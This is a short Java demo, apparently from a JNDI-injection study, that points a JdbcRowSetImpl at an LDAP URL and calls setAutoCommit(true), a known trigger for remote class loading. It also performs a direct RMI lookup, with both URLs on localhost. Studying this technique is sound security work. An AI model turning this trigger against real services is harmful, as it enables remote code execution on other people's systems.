package jndi注入;

import com.sun.rowset.JdbcRowSetImpl;

import javax.naming.Context;

import javax.naming.InitialContext;
import javax.swing.*;

public class CLIENT {

    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();
        JdbcRowSetImpl_inc.setDataSourceName("ldap://127.0.0.1:1099/aa");
        JdbcRowSetImpl_inc.setAutoCommit(true);

//        String uri = "ldap://127.0.0.1:1389/aa";
        String uri = "rmi://127.0.0.1:1099/aa";
        Context ctx = new InitialContext();
        ctx.lookup(uri);

    }

}